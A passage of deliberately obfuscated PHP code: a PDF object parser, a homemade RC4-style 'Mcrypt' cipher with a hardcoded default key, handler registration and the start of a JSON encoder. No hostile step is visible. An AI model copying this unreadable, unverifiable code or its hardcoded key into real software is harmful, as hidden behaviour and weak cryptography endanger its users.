×š“[1544]][$c–¨Ò ×š“[367]][1] = $Eİ§”ƒ¶[2]; } if (!$aç™ÜÉö Ò[$c–¨Ò ×š“[1544]][$c–¨Ò ×š“[1200]]) { return !1; } goto Dî¦¹í¤Œ; F‰¶¤Ü¼¦: if (preg_match($c–¨Ò ×š“[1570], $dœë¶×§, $Eİ§”ƒ¶) > 0) { $aç™ÜÉö Ò[$c–¨Ò ×š“[1544]][$c–¨Ò ×š“[77]] = intval($Eİ§”ƒ¶[1]); } if (preg_match($c–¨Ò ×š“[1571], $dœë¶×§, $Eİ§”ƒ¶) > 0) { $aç™ÜÉö Ò[$c–¨Ò ×š“[1544]][$c–¨Ò ×š“[1572]] = intval($Eİ§”ƒ¶[1]) . $c–¨Ò ×š“[70] . intval($Eİ§”ƒ¶[2]); } if (preg_match($c–¨Ò ×š“[1573], $dœë¶×§, $Eİ§”ƒ¶) > 0) { $aç™ÜÉö Ò[$c–¨Ò ×š“[1544]][$c–¨Ò ×š“[1574]] = intval($Eİ§”ƒ¶[1]) . $c–¨Ò ×š“[70] . intval($Eİ§”ƒ¶[2]); } goto Eƒ£“éòËö; Dî¦¹í¤Œ: if (preg_match($c–¨Ò ×š“[1577], $dœë¶×§, $Eİ§”ƒ¶) > 0) { } return $aç™ÜÉö Ò; goto e÷Óïµí»; e÷Óïµí»: } private static function getObjectValue($eâ­¸½ƒÕÏ, $bµ‡²ˆŒğ¤, $cÔŸ½´„„‘) { goto c”ãßÒ¹¤; eƒ‹Ğ¢âç–: return $B™ËÒ‰ç†§; goto C Û¥äİµÊ; bæŒªĞêç›: if (!is_array($Cµ·‹Š»¸ó[1])) { return array(); } $B™ËÒ‰ç†§ = array(); for ($dãµÛÃÛÑÎ = 0; $dãµÛÃÛÑÎ < count($Cµ·‹Š»¸ó[1]); $dãµÛÃÛÑÎ += 2) { $eåó´šˆ¿Ÿ = $Cµ·‹Š»¸ó[1][$dãµÛÃÛÑÎ]; $aİæÎåß“ = $Cµ·‹Š»¸ó[1][$dãµÛÃÛÑÎ + 1]; if (count($eåó´šˆ¿Ÿ) == 3 && $eåó´šˆ¿Ÿ[0] == $c÷’Ú†¿õ¶[8]) { $eòÇ“ƒ˜ = !1; if ($aİæÎåß“[0] == $c÷’Ú†¿õ¶[1578]) { $aİæÎåß“ = self::getObject($eâ­¸½ƒÕÏ, $bµ‡²ˆŒğ¤[$c÷’Ú†¿õ¶[1563]][$aİæÎåß“[1]]); } $eòÇ“ƒ˜ = $aİæÎåß“[1]; if ($eòÇ“ƒ˜ === !1) { continue; } if (is_string($eòÇ“ƒ˜)) { $eòÇ“ƒ˜ = self::decodeStr($eòÇ“ƒ˜); } $B™ËÒ‰ç†§[$eåó´šˆ¿Ÿ[1]] = $eòÇ“ƒ˜; } } goto eƒ‹Ğ¢âç–; c”ãßÒ¹¤: $c÷’Ú†¿õ¶ =& $_SERVER[¯Ò¬Èè]; $Cµ·‹Š»¸ó = self::getObject($eâ­¸½ƒÕÏ, $bµ‡²ˆŒğ¤[$c÷’Ú†¿õ¶[1563]][$cÔŸ½´„„‘]); if (is_string($Cµ·‹Š»¸ó[1])) { return $Cµ·‹Š»¸ó[1]; } goto bæŒªĞêç›; C Û¥äİµÊ: } private static function getObject($C“Êæô¼, $c¾é³Ã†œÕ) { $eÖ×¥ƒº = self::getObjectItem($C“Êæô¼, $c¾é³Ã†œÕ); $eÖ×¥ƒº = self::getObjectItem($C“Êæô¼, $eÖ×¥ƒº[2]); return $eÖ×¥ƒº; } private static function getObjectItem($c˜•½òˆËÀ, $A¥Ç‘ùê‹) { goto E“ŒİïÌ³œ; D‹äèÀ®“: $dâ—•„ªáö = self::getRawObject($F‘¾Õ‘Ù¼ì, $cù…™‹ƒ§À); if ($A¥Ç‘ùê‹ >= $A«Áìáññƒ) { $dâ—•„ªáö[2] = $dâ—•„ªáö[2] + $A«Áìáññƒ; } else { if ($A¥Ç‘ùê‹ > $eÁØÉÆ§öÂ && $A¥Ç‘ùê‹ <= $A«Áìáññƒ) { $dâ—•„ªáö[2] = $dâ—•„ªáö[2] + $A¥Ç‘ùê‹; } } return $dâ—•„ªáö; goto aÌŠÀÏ¸½ª; E“ŒİïÌ³œ: $C‰µîã›øå =& $_SERVER[¯Ò¬Èè]; $eÁØÉÆ§öÂ = $c˜•½òˆËÀ[$C‰µîã›øå[1541]]; $A«Áìáññƒ = $c˜•½òˆËÀ[$C‰µîã›øå[77]] - $eÁØÉÆ§öÂ; goto c…ß¾«óÎ; c…ß¾«óÎ: $cù…™‹ƒ§À = $A¥Ç‘ùê‹ >= $A«Áìáññƒ ? $A¥Ç‘ùê‹ - $A«Áìáññƒ : $A¥Ç‘ùê‹; $F‘¾Õ‘Ù¼ì = $A¥Ç‘ùê‹ >= $A«Áìáññƒ ? $c˜•½òˆËÀ[$C‰µîã›øå[1543]] : $c˜•½òˆËÀ[$C‰µîã›øå[1542]]; if ($A¥Ç‘ùê‹ > $eÁØÉÆ§öÂ && $A¥Ç‘ùê‹ <= $A«Áìáññƒ) { $cù…™‹ƒ§À = 0; $F‘¾Õ‘Ù¼ì = StreamWrapperIO::read($c˜•½òˆËÀ[$C‰µîã›øå[75]], $A¥Ç‘ùê‹, $eÁØÉÆ§öÂ); } goto D‹äèÀ®“; aÌŠÀÏ¸½ª: } private static function decodeStr($få÷×öˆ‚ğ) { goto FÅÙŸœ¢ÄÏ; Bâ”¿–Ğ˜›: $få÷×öˆ‚ğ = $câã÷ŠëÂá[33]; foreach ($dä“Æ©ğôÙ as $DÆø‚•„„‡) { if (preg_match($câã÷ŠëÂá[1593], $DÆø‚•„„‡) && !1 === stripos($DÆø‚•„„‡, $câã÷ŠëÂá[1594])) { $DÆø‚•„„‡ = preg_replace($câã÷ŠëÂá[1595], $câã÷ŠëÂá[33], $DÆø‚•„„‡); $DÆø‚•„„‡ = trim($DÆø‚•„„‡, $câã÷ŠëÂá[935]); $DÆø‚•„„‡ = pack($câã÷ŠëÂá[1596], $DÆø‚•„„‡); $få÷×öˆ‚ğ .= $DÆø‚•„„‡; } else { $få÷×öˆ‚ğ .= $DÆø‚•„„‡; } } if (preg_match($câã÷ŠëÂá[1597], $få÷×öˆ‚ğ)) { $D„ Ó¨™™Ã = substr($få÷×öˆ‚ğ, 2); $få÷×öˆ‚ğ = $câã÷ŠëÂá[33]; $B­ç“œ©¼ = strlen($D„ Ó¨™™Ã); for ($Dç¾ÔÏ¬¦ = 0; $Dç¾ÔÏ¬¦ < $B­ç“œ©¼; $Dç¾ÔÏ¬¦ += 2) { $Cà“ŸÓß°› = hexdec(bin2hex(substr($D„ Ó¨™™Ã, $Dç¾ÔÏ¬¦, 2))); $få÷×öˆ‚ğ .= mb_convert_encoding($câã÷ŠëÂá[1598] . intval($Cà“ŸÓß°›) . $câã÷ŠëÂá[67], $câã÷ŠëÂá[1599], $câã÷ŠëÂá[1600]); } } goto E«¨Ğòô²Ì; FÅÙŸœ¢ÄÏ: $câã÷ŠëÂá =& $_SERVER[¯Ò¬Èè]; $få÷×öˆ‚ğ = str_replace(array($câã÷ŠëÂá[1579], $câã÷ŠëÂá[1580], $câã÷ŠëÂá[1581], $câã÷ŠëÂá[1582], $câã÷ŠëÂá[1583], $câã÷ŠëÂá[1584], $câã÷ŠëÂá[1585], $câã÷ŠëÂá[1586]), array($câã÷ŠëÂá[93], $câã÷ŠëÂá[50], $câã÷ŠëÂá[8], $câã÷ŠëÂá[248], $câã÷ŠëÂá[826], $câã÷ŠëÂá[217], $câã÷ŠëÂá[1001], $câã÷ŠëÂá[330]), $få÷×öˆ‚ğ); $dä“Æ©ğôÙ = preg_split($câã÷ŠëÂá[1587], $få÷×öˆ‚ğ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto D¦õ§Ä‘Úî; b­¥õ”‹¾: $få÷×öˆ‚ğ = $câã÷ŠëÂá[33]; foreach ($dä“Æ©ğôÙ as $DÆø‚•„„‡) { if (preg_match($câã÷ŠëÂá[1590], $DÆø‚•„„‡)) { $få÷×öˆ‚ğ .= \chr(hexdec(trim($DÆø‚•„„‡, $câã÷ŠëÂá[1591]))); } else { $få÷×öˆ‚ğ .= $DÆø‚•„„‡; } } $dä“Æ©ğôÙ = preg_split($câã÷ŠëÂá[1592], $få÷×öˆ‚ğ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Bâ”¿–Ğ˜›; E«¨Ğòô²Ì: return $få÷×öˆ‚ğ; goto B§­ä”§; D¦õ§Ä‘Úî: $få÷×öˆ‚ğ = $câã÷ŠëÂá[33]; foreach ($dä“Æ©ğôÙ as $DÆø‚•„„‡) { if (preg_match($câã÷ŠëÂá[1588], $DÆø‚•„„‡)) { $få÷×öˆ‚ğ .= \chr(octdec(trim($DÆø‚•„„‡, $câã÷ŠëÂá[93]))); } else { $få÷×öˆ‚ğ .= $DÆø‚•„„‡; } } $dä“Æ©ğôÙ = preg_split($câã÷ŠëÂá[1589], $få÷×öˆ‚ğ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto b­¥õ”‹¾; B§­ä”§: } private static function getRawObject($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡ = 0) { goto dÇÊ¤„Î…ã; dÇÊ¤„Î…ã: $F’Öğ¼ÛÍŸ =& $_SERVER[¯Ò¬Èè]; $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[33]; $Døê‡Ùì˜¤ = $F’Öğ¼ÛÍŸ[33]; goto E™ğ¼¦ùœ; aØ§œ‹÷å˜: return array($d®êÅö¤²Â, $Døê‡Ùì˜¤, $FĞØ¨‚„Ú¡); goto d÷É§·; E™ğ¼¦ùœ: $FĞØ¨‚„Ú¡ += strspn($FÈŸ·ƒ·§, $F’Öğ¼ÛÍŸ[1601], $FĞØ¨‚„Ú¡); $a¨¼Ãºäƒº = $FÈŸ·ƒ·§[$FĞØ¨‚„Ú¡]; switch ($a¨¼Ãºäƒº) { case $F’Öğ¼ÛÍŸ[1602]: $Bë°¢Š‘Áâ = strcspn($FÈŸ·ƒ·§, $F’Öğ¼ÛÍŸ[1603], $FĞØ¨‚„Ú¡); if ($Bë°¢Š‘Áâ > 0) { $FĞØ¨‚„Ú¡ += $Bë°¢Š‘Áâ; return self::getRawObject($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡); } break; case $F’Öğ¼ÛÍŸ[8]: $d®êÅö¤²Â = $a¨¼Ãºäƒº; ++$FĞØ¨‚„Ú¡; $C ¼àíé…‡ = preg_match($F’Öğ¼ÛÍŸ[1604], substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 256), $eİùˆ„š›µ); if (1 == $C ¼àíé…‡) { $Døê‡Ùì˜¤ = $eİùˆ„š›µ[1]; $FĞØ¨‚„Ú¡ += strlen($Døê‡Ùì˜¤); } break; case $F’Öğ¼ÛÍŸ[248]: case $F’Öğ¼ÛÍŸ[826]: $d®êÅö¤²Â = $a¨¼Ãºäƒº; ++$FĞØ¨‚„Ú¡; $FçËÛÓäÂ” = $FĞØ¨‚„Ú¡; if ($F’Öğ¼ÛÍŸ[248] == $a¨¼Ãºäƒº) { $BÔÎ—ñ„ò = 1; while ($BÔÎ—ñ„ò > 0) { if (!isset($FÈŸ·ƒ·§[$FçËÛÓäÂ”])) { break; } $c‹‹ƒßÚÉñ = $FÈŸ·ƒ·§[$FçËÛÓäÂ”]; switch ($c‹‹ƒßÚÉñ) { case $F’Öğ¼ÛÍŸ[93]: ++$FçËÛÓäÂ”; break; case $F’Öğ¼ÛÍŸ[248]: ++$BÔÎ—ñ„ò; break; case $F’Öğ¼ÛÍŸ[826]: --$BÔÎ—ñ„ò; break; } ++$FçËÛÓäÂ”; } $Døê‡Ùì˜¤ = substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, $FçËÛÓäÂ” - $FĞØ¨‚„Ú¡ - 1); $FĞØ¨‚„Ú¡ = $FçËÛÓäÂ”; } break; case $F’Öğ¼ÛÍŸ[157]: case $F’Öğ¼ÛÍŸ[476]: $d®êÅö¤²Â = $a¨¼Ãºäƒº; ++$FĞØ¨‚„Ú¡; if ($F’Öğ¼ÛÍŸ[157] == $a¨¼Ãºäƒº) { $Døê‡Ùì˜¤ = array(); do { $F´¤ÈÕŒ® = $FĞØ¨‚„Ú¡; $B¶øÎ†ºå = self::getRawObject($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡); $FĞØ¨‚„Ú¡ = $B¶øÎ†ºå[2]; $Døê‡Ùì˜¤[] = $B¶øÎ†ºå; } while ($F’Öğ¼ÛÍŸ[476] != $B¶øÎ†ºå[0] && $FĞØ¨‚„Ú¡ != $F´¤ÈÕŒ®); array_pop($Døê‡Ùì˜¤); } break; case $F’Öğ¼ÛÍŸ[934]: case $F’Öğ¼ÛÍŸ[937]: if (isset($FÈŸ·ƒ·§[$FĞØ¨‚„Ú¡ + 1]) && $FÈŸ·ƒ·§[$FĞØ¨‚„Ú¡ + 1] == $a¨¼Ãºäƒº) { $d®êÅö¤²Â = $a¨¼Ãºäƒº . $a¨¼Ãºäƒº; $FĞØ¨‚„Ú¡ += 2; if ($F’Öğ¼ÛÍŸ[934] == $a¨¼Ãºäƒº) { $Døê‡Ùì˜¤ = array(); do { $F´¤ÈÕŒ® = $FĞØ¨‚„Ú¡; $B¶øÎ†ºå = self::getRawObject($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡); $FĞØ¨‚„Ú¡ = $B¶øÎ†ºå[2]; $Døê‡Ùì˜¤[] = $B¶øÎ†ºå; } while ($F’Öğ¼ÛÍŸ[1605] != $B¶øÎ†ºå[0] && $FĞØ¨‚„Ú¡ != $F´¤ÈÕŒ®); array_pop($Døê‡Ùì˜¤); } } else { $d®êÅö¤²Â = $a¨¼Ãºäƒº; ++$FĞØ¨‚„Ú¡; $C ¼àíé…‡ = preg_match($F’Öğ¼ÛÍŸ[1606], substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡), $eİùˆ„š›µ); if ($F’Öğ¼ÛÍŸ[934] == $a¨¼Ãºäƒº && 1 == $C ¼àíé…‡) { $Døê‡Ùì˜¤ = strtr($eİùˆ„š›µ[1], $F’Öğ¼ÛÍŸ[1607], $F’Öğ¼ÛÍŸ[33]); $FĞØ¨‚„Ú¡ += \strlen($eİùˆ„š›µ[0]); } elseif (!1 !== ($Bàİ÷¹³Úë = strpos($FÈŸ·ƒ·§, $F’Öğ¼ÛÍŸ[937], $FĞØ¨‚„Ú¡))) { $FĞØ¨‚„Ú¡ = $Bàİ÷¹³Úë + 1; } } break; default: if ($F’Öğ¼ÛÍŸ[1608] == substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 6)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1608]; $FĞØ¨‚„Ú¡ += 6; } elseif ($F’Öğ¼ÛÍŸ[99] == substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 4)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[99]; $FĞØ¨‚„Ú¡ += 4; $Døê‡Ùì˜¤ = $F’Öğ¼ÛÍŸ[99]; } elseif ($F’Öğ¼ÛÍŸ[1609] == substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 4)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1610]; $FĞØ¨‚„Ú¡ += 4; $Døê‡Ùì˜¤ = $F’Öğ¼ÛÍŸ[1609]; } elseif ($F’Öğ¼ÛÍŸ[1611] == substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 5)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1610]; $FĞØ¨‚„Ú¡ += 5; $Døê‡Ùì˜¤ = $F’Öğ¼ÛÍŸ[1611]; } elseif ($F’Öğ¼ÛÍŸ[1612] == substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 6)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1612]; $FĞØ¨‚„Ú¡ += 6; if (1 == preg_match($F’Öğ¼ÛÍŸ[1613], substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡), $eİùˆ„š›µ)) { $FĞØ¨‚„Ú¡ += strlen($eİùˆ„š›µ[0]); $B²ßÂñÊ’« = $F’Öğ¼ÛÍŸ[1614]; $C ¼àíé…‡ = preg_match($B²ßÂñÊ’«, substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡), $eİùˆ„š›µ, PREG_OFFSET_CAPTURE); if (1 == $C ¼àíé…‡) { $Døê‡Ùì˜¤ = substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, $eİùˆ„š›µ[0][1]); $FĞØ¨‚„Ú¡ += $eİùˆ„š›µ[1][1]; } } } elseif ($F’Öğ¼ÛÍŸ[1615] == substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 9)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1615]; $FĞØ¨‚„Ú¡ += 9; } elseif (1 == preg_match($F’Öğ¼ÛÍŸ[1616], substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 33), $eİùˆ„š›µ)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1578]; $FĞØ¨‚„Ú¡ += strlen($eİùˆ„š›µ[0]); $Døê‡Ùì˜¤ = intval($eİùˆ„š›µ[1]) . $F’Öğ¼ÛÍŸ[70] . intval($eİùˆ„š›µ[2]); } elseif (1 == preg_match($F’Öğ¼ÛÍŸ[1617], substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, 33), $eİùˆ„š›µ)) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1618]; $Døê‡Ùì˜¤ = intval($eİùˆ„š›µ[1]) . $F’Öğ¼ÛÍŸ[70] . intval($eİùˆ„š›µ[2]); $FĞØ¨‚„Ú¡ += strlen($eİùˆ„š›µ[0]); } elseif (($F¹ŞÑÆ•ù¸ = strspn($FÈŸ·ƒ·§, $F’Öğ¼ÛÍŸ[1619], $FĞØ¨‚„Ú¡)) > 0) { $d®êÅö¤²Â = $F’Öğ¼ÛÍŸ[1620]; $Døê‡Ùì˜¤ = substr($FÈŸ·ƒ·§, $FĞØ¨‚„Ú¡, $F¹ŞÑÆ•ù¸); $FĞØ¨‚„Ú¡ += $F¹ŞÑÆ•ù¸; } break; } goto aØ§œ‹÷å˜; d÷É§·: } } goto CË¿‡Ä‡îƒ; Fóªˆ‡Ïƒ—: class Mcrypt { public static $defaultKey = "\x61\x21\164\x61\153\x41\72\144\154\x6d\x63\x6c\144\105\166\54\x65"; public static function encode($C©š—ËŒ, $d§ºÖ£‘ÎÚ = '', $d“Ãñøğë³ = 0, $D‘½Á•õî = '') { goto dß†ˆÓá¾; E†Á³½Ëß: $bçƒ²µ¥¡ó = md5(substr($d§ºÖ£‘ÎÚ, 0, 16)); $F‘»Ë¾†‰ = md5(substr($d§ºÖ£‘ÎÚ, 16, 16)); $D‘½Á•õî = $D‘½Á•õî ? $D‘½Á•õî : md5(microtime()); goto fÔñœïÌ; fÔñœïÌ: $D³‘£Ã­›÷ = substr($D‘½Á•õî, -$fİöÛ Ş¶); $E‚†¨ª…«Æ = $bçƒ²µ¥¡ó . md5($bçƒ²µ¥¡ó . $D³‘£Ã­›÷); $aäîàÀŒˆ = strlen($E‚†¨ª…«Æ); goto B£‘Öˆ‘ç; eòøĞ˜ˆÍ: for ($FÎÇàê˜Âˆ = 0; $FÎÇàê˜Âˆ <= 255; $FÎÇàê˜Âˆ++) { $fªõ‘…âãŠ[$FÎÇàê˜Âˆ] = ord($E‚†¨ª…«Æ[$FÎÇàê˜Âˆ % $aäîàÀŒˆ]); } $F¸”ù¶›‰… = range(0, 255); for ($F‹°™Ùƒ‹ = $FÎÇàê˜Âˆ = 0; $FÎÇàê˜Âˆ < 256; $FÎÇàê˜Âˆ++) { $F‹°™Ùƒ‹ = ($F‹°™Ùƒ‹ + $F¸”ù¶›‰…[$FÎÇàê˜Âˆ] + $fªõ‘…âãŠ[$FÎÇàê˜Âˆ]) % 256; $eê°ĞòÇ”… = $F¸”ù¶›‰…[$FÎÇàê˜Âˆ]; $F¸”ù¶›‰…[$FÎÇàê˜Âˆ] = $F¸”ù¶›‰…[$F‹°™Ùƒ‹]; $F¸”ù¶›‰…[$F‹°™Ùƒ‹] = $eê°ĞòÇ”…; } goto D¬‹¶”¿Ã; dß†ˆÓá¾: $Dß·æÖÓå¬ =& $_SERVER[¯Ò¬Èè]; $fİöÛ Ş¶ = 4; $d§ºÖ£‘ÎÚ = md5($d§ºÖ£‘ÎÚ ? $d§ºÖ£‘ÎÚ : self::$defaultKey); goto E†Á³½Ëß; fÈ‘¿”…ÇÜ: $dçË¾õƒñ¼ = str_replace(array($Dß·æÖÓå¬[284], $Dß·æÖÓå¬[8], $Dß·æÖÓå¬[916]), array($Dß·æÖÓå¬[412], $Dß·æÖÓå¬[70], $Dß·æÖÓå¬[91]), $dçË¾õƒñ¼); return $dçË¾õƒñ¼; goto bÖÉ¯Š³´¨; D¬‹¶”¿Ã: $dçË¾õƒñ¼ = $Dß·æÖÓå¬[33]; for ($d‡ŞÜê–ƒì = $F‹°™Ùƒ‹ = $FÎÇàê˜Âˆ = 0; $FÎÇàê˜Âˆ < $f’ÀÕ¦ˆ†‘; $FÎÇàê˜Âˆ++) { $d‡ŞÜê–ƒì = ($d‡ŞÜê–ƒì + 1) % 256; $F‹°™Ùƒ‹ = ($F‹°™Ùƒ‹ + $F¸”ù¶›‰…[$d‡ŞÜê–ƒì]) % 256; $eê°ĞòÇ”… = $F¸”ù¶›‰…[$d‡ŞÜê–ƒì]; $F¸”ù¶›‰…[$d‡ŞÜê–ƒì] = $F¸”ù¶›‰…[$F‹°™Ùƒ‹]; $F¸”ù¶›‰…[$F‹°™Ùƒ‹] = $eê°ĞòÇ”…; $dçË¾õƒñ¼ .= chr(ord($C©š—ËŒ[$FÎÇàê˜Âˆ]) ^ $F¸”ù¶›‰…[($F¸”ù¶›‰…[$d‡ŞÜê–ƒì] + $F¸”ù¶›‰…[$F‹°™Ùƒ‹]) % 256]); } $dçË¾õƒñ¼ = $D³‘£Ã­›÷ . str_replace($Dß·æÖÓå¬[916], $Dß·æÖÓå¬[33], base64_encode($dçË¾õƒñ¼)); goto fÈ‘¿”…ÇÜ; B£‘Öˆ‘ç: $C©š—ËŒ = sprintf($Dß·æÖÓå¬[1940], $d“Ãñøğë³ ? $d“Ãñøğë³ + time() : 0) . substr(md5($C©š—ËŒ . $F‘»Ë¾†‰), 0, 16) . $C©š—ËŒ; $f’ÀÕ¦ˆ†‘ = strlen($C©š—ËŒ); $fªõ‘…âãŠ = array(); goto eòøĞ˜ˆÍ; bÖÉ¯Š³´¨: } public static function decode($Aß°Ä‹í¸æ, $FŠè©Úò = '') { goto Aˆ‰‰…ß ¨; c¬­‚‰Ò: for ($Bµ»Ü­Äö = 0; $Bµ»Ü­Äö <= 255; $Bµ»Ü­Äö++) { $f †ÒĞ‘â­[$Bµ»Ü­Äö] = ord($FÆœ¾˜ãˆ[$Bµ»Ü­Äö % $AÑç‘‡Ëá]); } $B‰œğÏŒ¡ = range(0, 255); for ($A†²éÆæô = $Bµ»Ü­Äö = 0; $Bµ»Ü­Äö < 256; $Bµ»Ü­Äö++) { $A†²éÆæô = ($A†²éÆæô + $B‰œğÏŒ¡[$Bµ»Ü­Äö] + $f †ÒĞ‘â­[$Bµ»Ü­Äö]) % 256; $f³ÑíÖù‰ç = $B‰œğÏŒ¡[$Bµ»Ü­Äö]; $B‰œğÏŒ¡[$Bµ»Ü­Äö] = $B‰œğÏŒ¡[$A†²éÆæô]; $B‰œğÏŒ¡[$A†²éÆæô] = $f³ÑíÖù‰ç; } goto DŞõÈÒİÎ”; Aˆ‰‰…ß ¨: $fÉì¦áš =& $_SERVER[¯Ò¬Èè]; $Aß°Ä‹í¸æ = str_replace(array($fÉì¦áš[412], $fÉì¦áš[70], $fÉì¦áš[91]), array($fÉì¦áš[284], $fÉì¦áš[8], $fÉì¦áš[916]), $Aß°Ä‹í¸æ); $A‡‰ĞîÛ® = 4; goto cÅïœõ…‚µ; cÅïœõ…‚µ: $FŠè©Úò = md5($FŠè©Úò ? $FŠè©Úò : self::$defaultKey); $AòĞ¢¯Í£è = md5(substr($FŠè©Úò, 0, 16)); $A»°ÙÅùÄ» = md5(substr($FŠè©Úò, 16, 16)); goto fÖ‹½®¶¨; D‘‹Âš‰Æ: if (($EÑ‘¨¾­ÌÑ == 0 || $EÑ‘¨¾­ÌÑ - time() > 0) && substr($f…¡ëÑÎà±, 10, 16) == substr(md5(substr($f…¡ëÑÎà±, 26) . $A»°ÙÅùÄ»), 0, 16)) { return substr($f…¡ëÑÎà±, 26); } else { return $fÉì¦áš[33]; } goto dÓµ‘˜ÁÈ°; DŞõÈÒİÎ”: $f…¡ëÑÎà± = $fÉì¦áš[33]; for ($B‰§­´¤Ùâ = $A†²éÆæô = $Bµ»Ü­Äö = 0; $Bµ»Ü­Äö < $cŠ‡Ãê¥Ó; $Bµ»Ü­Äö++) { $B‰§­´¤Ùâ = ($B‰§­´¤Ùâ + 1) % 256; $A†²éÆæô = ($A†²éÆæô + $B‰œğÏŒ¡[$B‰§­´¤Ùâ]) % 256; $f³ÑíÖù‰ç = $B‰œğÏŒ¡[$B‰§­´¤Ùâ]; $B‰œğÏŒ¡[$B‰§­´¤Ùâ] = $B‰œğÏŒ¡[$A†²éÆæô]; $B‰œğÏŒ¡[$A†²éÆæô] = $f³ÑíÖù‰ç; $f…¡ëÑÎà± .= chr(ord($Aß°Ä‹í¸æ[$Bµ»Ü­Äö]) ^ $B‰œğÏŒ¡[($B‰œğÏŒ¡[$B‰§­´¤Ùâ] + $B‰œğÏŒ¡[$A†²éÆæô]) % 256]); } $EÑ‘¨¾­ÌÑ = intval(substr($f…¡ëÑÎà±, 0, 10)); goto D‘‹Âš‰Æ; E‡ì‚Êö‹¬: $Aß°Ä‹í¸æ = base64_decode(substr($Aß°Ä‹í¸æ, $A‡‰ĞîÛ®)); $cŠ‡Ãê¥Ó = strlen($Aß°Ä‹í¸æ); $f †ÒĞ‘â­ = array(); goto c¬­‚‰Ò; fÖ‹½®¶¨: $A¸º± È»Š = substr($Aß°Ä‹í¸æ, 0, $A‡‰ĞîÛ®); $FÆœ¾˜ãˆ = $AòĞ¢¯Í£è . md5($AòĞ¢¯Í£è . $A¸º± È»Š); $AÑç‘‡Ëá = strlen($FÆœ¾˜ãˆ); goto E‡ì‚Êö‹¬; dÓµ‘˜ÁÈ°: } } define($_SERVER[¯Ò¬Èè][1941], 1); define($_SERVER[¯Ò¬Èè][1942], 2); goto eãŒÜ ˆíÉ; D¢ÕéÊ×Œ: register_shutdown_function($_SERVER[™‡«†³Ğ][36]); set_error_handler($_SERVER[™‡«†³Ğ][49], $c½×îŒ¢‰³); if (function_exists($_SERVER[™‡«†³Ğ][50])) { set_exception_handler($_SERVER[™‡«†³Ğ][51]); } goto cÔŸõÏ¤‘¢; eîÄìŞ¿’”: define($_SERVER[¯Ò¬Èè][1946], 16); define($_SERVER[¯Ò¬Èè][1947], 32); class Services_JSON { function __construct($bÖËŒ¿…¿å = 0) { $this->use = $bÖËŒ¿…¿å; } function utf162utf8($f™›š± ºÌ) { $cÔ«”¡„¸ =& $_SERVER[¯Ò¬Èè]; if (function_exists($cÔ«”¡„¸[68])) { return mb_convert_encoding($f™›š± ºÌ, $cÔ«”¡„¸[1599], $cÔ«”¡„¸[1948]); } $FÔĞ½šî¨ = ord($f™›š± ºÌ[0]) << 8 | ord($f™›š± ºÌ[1]); switch (!0) { case (127 & $FÔĞ½šî¨) == $FÔĞ½šî¨: return chr(127 & $FÔĞ½šî¨); case (2047 & $FÔĞ½šî¨) == $FÔĞ½šî¨: return chr(192 | $FÔĞ½šî¨ >> 6 & 31) . chr(128 | $FÔĞ½šî¨ & 63); case (65535 & $FÔĞ½šî¨) == $FÔĞ½šî¨: return chr(224 | $FÔĞ½šî¨ >> 12 & 15) . chr(128 | $FÔĞ½šî¨ >> 6 & 63) . chr(128 | $FÔĞ½šî¨ & 63); } return $cÔ«”¡„¸[33]; } function utf82utf16($a¤½ØÙ¾) { $e˜ìˆ®¢£– =& $_SERVER[¯Ò¬Èè]; if (function_exists($e˜ìˆ®¢£–[68])) { return mb_convert_encoding($a¤½ØÙ¾, $e˜ìˆ®¢£–[1948], $e˜ìˆ®¢£–[1599]); } switch (strlen($a¤½ØÙ¾)) { case 1: return $a¤½ØÙ¾; case 2: return chr(7 & ord($a¤½ØÙ¾[0]) >> 2) . chr(192 & ord($a¤½ØÙ¾[0]) << 6 | 63 & ord($a¤½ØÙ¾[1])); case 3: return chr(240 & ord($a¤½ØÙ¾[0]) << 4 | 15 & ord($a¤½ØÙ¾[1]) >> 2) . chr(192 & ord($a¤½ØÙ¾[1]) << 6 | 127 & ord($a¤½ØÙ¾[2])); } return $e˜ìˆ®¢£–[33]; } function encode($DÇ×Œ¿“Öù) { $E‡îáÁù„ =& $_SERVER[¯Ò¬Èè]; switch (gettype($DÇ×Œ¿“Öù)) { case $E‡îáÁù„[1610]: return $DÇ×Œ¿“Öù ? $E‡îáÁù„[1609] : $E‡îáÁù„[1611]; case $E‡îáÁù„[1949]: return $E‡îáÁù„[99]; case $E‡îáÁù„[303]: return (int) $DÇ×Œ¿“Öù; case $E‡îáÁù„[278]: case $E‡îáÁù„[277]: return (double) $DÇ×Œ¿“Öù; case $E‡îáÁù„[312]: $A÷²‚Øˆ = $E‡îáÁù„[33]; $D½¸ ÷‘ë¦ = strlen($DÇ×Œ¿“Öù); for ($d¢³“ØŸ” = 0; 